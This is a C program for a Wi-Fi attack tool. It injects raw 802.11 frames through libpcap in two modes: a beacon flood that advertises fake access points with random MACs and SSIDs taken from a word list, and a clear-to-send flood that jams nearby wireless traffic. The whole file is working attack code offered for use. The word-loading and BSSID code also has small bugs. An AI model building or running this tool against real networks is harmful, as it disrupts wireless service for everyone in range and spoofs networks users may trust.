#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>
#include <pcap/pcap.h>
#include <time.h>
#include <linux/if_ether.h>
#include <ctype.h>

struct __attribute__ ((__packed__)) radiotap {
	uint8_t revision;
	uint8_t pad;
	uint16_t length;
	uint32_t present;
};

struct __attribute__ ((__packed__)) wifi {
	uint16_t type;
	uint16_t duration;
	uint8_t raddr[ETH_ALEN];
	uint8_t saddr[ETH_ALEN];
	uint8_t bssid[ETH_ALEN];
	uint16_t fragment;
};

struct __attribute__ ((__packed__)) tlv {
	uint8_t type;
	uint8_t length;
	uint8_t data[0];
};

struct __attribute__ ((__packed__)) mgmt {
	uint64_t timestamp;
	uint16_t interval;
	uint16_t capabilities;
};

struct __attribute__ ((__packed__)) cts {
	struct radiotap radiotap;
	uint8_t type;
	uint8_t flags;
	uint16_t duration;
	uint8_t raddr[ETH_ALEN];
};

struct __attribute__ ((__packed__)) beacon {
	struct radiotap radiotap;
	struct wifi wifi;
	struct mgmt mgmt;
	struct tlv srate;
	uint8_t srated[8];
	struct tlv essid;
};

static char ** load_words(char *path, int *lines)
{
	char **words = NULL;
	char *filecont;
	char *last;
	FILE *dict = fopen(optarg, "r");
	if(!dict) {
		perror("open");
		exit(1);
	}

	fseek(dict, 0L, SEEK_END);
	long len = ftell(dict);
	filecont = malloc(len);
	fseek(dict, 0L, SEEK_SET);
	if(!fread(filecont, 1, len, dict)) {
		perror("read");
		exit(1);
	}
	fclose(dict);

	*lines = 0;
	/* count and split lines */
	for(last = filecont; last; last = strchr(last, '\n')) {
		if(last != filecont)
			*last = 0;
		last++;
		(*lines)++;
	}

	/* set pointers */
	words = malloc(*lines * sizeof(*words));
	for(*lines = 0, last = filecont; last < filecont + len; ) {
		int i, len;
		if(!*last) {
			last++;
			continue;
		}
		len = strlen(last);
		for(i = 0; i < len; i++)
			if(!isalnum(last[i])) {
				last += len;
				continue;
			}
		words[(*lines)++] = last;
		last += len + 1;
	}

	return words;
}

enum attack {
	INVALID,
	BEACON,
	CTS
};

static inline void randaddr(uint8_t *addr)
{
	addr[0] = rand() & 0xfe;
	addr[1] = rand();
	addr[2] = rand();
	addr[3] = rand();
	addr[4] = rand();
	addr[5] = rand();
}

static void beaconize(pcap_t *pcap, char *words[], int lines)
{
	char buf[ETH_FRAME_LEN] = {0};
	struct beacon *template = (struct beacon *)buf;
	template->radiotap.length = htole16(sizeof(struct radiotap));
	template->wifi.type = htole16(0x80);
	memset(template->wifi.raddr, 0xff, ETH_ALEN);
	template->mgmt.interval = htole16(0x64);
	template->mgmt.capabilities = htole16(0x0401);
	template->srate.type = 0x01;
	template->srate.length = 0x08;
	memcpy(template->srate.data, "\x82\x84\x8b\x96\x12\x24\x48\x6c", 8);

	while(1) {
		char *word = words[rand() % lines];
		template->essid.length = strlen(word);

		/* avoid overflows */
		if(sizeof(*template) + template->essid.length > sizeof(buf))
			continue;

		/* fake but valid mac address */
		randaddr(template->wifi.saddr);
		*template->wifi.bssid = *template->wifi.saddr;
		strcpy((char *)&template->essid.data, word);
		template->essid.length = strlen(word);
		if(!pcap_inject(pcap, template, sizeof(*template) + template->essid.length))
			exit(0);
	}
}

static void ctsize(pcap_t *pcap)
{
	struct cts cts = {
		.radiotap.length = htole16(sizeof(struct radiotap)),
		.type = 0xc4,
		.duration = htole16(0x7d00)
	};
	while(1) {
		randaddr(cts.raddr);
		if(!pcap_inject(pcap, &cts, sizeof(cts)))
			exit(0);
	}
}

int main(int argc, char *argv[])
{
	char c;
	pcap_t *pcap;
	int lines;
	char **words;
	enum attack attack = INVALID;

	while((c = getopt(argc, argv, "bcf:")) != -1) {
		switch(c) {
		case 'f':
			words = load_words(optarg, &lines);
			printf("Loaded %d words\n", lines);
			break;
		case 'b':
			attack = BEACON;
			break;
		case 'c':
			attack = CTS;
			break;
		}
	}
	if(optind != argc - 1 || attack == INVALID || (attack == BEACON && !lines)) {
		fprintf(stderr, "usage: %s -b -f <file> <iface>\n", argv[0]);
		fprintf(stderr, "usage: %s -c <iface>\n", argv[0]);
		return 1;
	} else {
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap = pcap_open_live(argv[optind], 96, 0, 0, errbuf);
		if(!pcap) {
			perror("pcap_create");
			return 1;
		}
		srand(time(NULL));
	}

	/* inject */
	switch(attack) {
	case BEACON:
		printf("beaconing on %s...\n", argv[optind]);
		beaconize(pcap, words, lines);
		break;
	case CTS:
		printf("CTSing on %s...\n", argv[optind]);
		ctsize(pcap);
		break;
	default:
		fprintf(stderr, "unknown attack type\n");
	}

	return 0;
}
